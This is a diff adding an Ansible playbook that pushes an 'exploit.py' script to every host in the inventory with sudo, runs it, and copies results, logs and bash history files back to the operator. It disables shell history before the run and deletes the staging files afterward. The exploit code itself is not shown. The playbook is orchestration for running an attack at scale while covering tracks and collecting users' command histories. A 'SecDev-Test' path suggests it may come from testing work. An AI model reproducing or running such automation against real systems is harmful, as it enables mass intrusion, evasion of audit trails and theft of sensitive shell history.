@@ -1,0 +1,70 @@
+---
+- name: Run exploit to all remote servers
+  hosts: all
+  sudo: yes
+  gather_facts: yes
+  vars:
+    USER: fahadk
+    REMOTE_STAGING_DIR: /Users/fahadk/GithubProjects/staging
+    EXPLOIT_HOST_HOME: /Users/fahadk/GithubProjects/SecDev-Test
+  tasks:
+
+  - name: Disable history
+    shell: |
+      set +o history
+
+  - name: Create staging directory
+    file: path='{{ REMOTE_STAGING_DIR }}' state=directory
+
+  - name: Copy exploit script to remote server
+    copy:
+     src: "{{EXPLOIT_HOST_HOME}}/exploit.py"
+     dest: '{{ REMOTE_STAGING_DIR }}'
+     mode: 0755
+
+  - name: Copy config file to remote server
+    copy:
+     src:  "{{EXPLOIT_HOST_HOME}}/config.json"
+     dest: '{{ REMOTE_STAGING_DIR }}'
+     mode: 0755
+
+  - name: run exploit
+    shell: |
+      python exploit.py
+    args:
+      chdir: '{{ REMOTE_STAGING_DIR }}'
+
+  - name: set pernissions before copy
+    file:
+     path: '{{ REMOTE_STAGING_DIR }}'
+     mode: 0755
+     recurse: yes
+
+  - name: Copy all files from remote server to host
+    copy:
+     dest: "{{EXPLOIT_HOST_HOME}}/{{inventory_hostname}}/"
+     src: "{{REMOTE_STAGING_DIR}}/results.txt"
+     mode: 0755
+     owner: '{{ USER }}'
+
+  - name: Copy all files from remote server to host
+    copy:
+     dest: "{{EXPLOIT_HOST_HOME}}/{{inventory_hostname}}/"
+     src: "{{REMOTE_STAGING_DIR}}/exploit.log"
+     mode: 0755
+     owner: fahadk
+
+  - name: Copy bash files
+    copy:
+     dest: "{{EXPLOIT_HOST_HOME}}/{{inventory_hostname}}"
+     src: "{{REMOTE_STAGING_DIR}}/bash_history_files/"
+     mode: 0755
+
+  - name: Cleanup files in remote staging directory
+    file:
+     state: absent
+     path: '{{ REMOTE_STAGING_DIR }}'
+
+  - name: Enable history
+    shell: |
+      set -o history
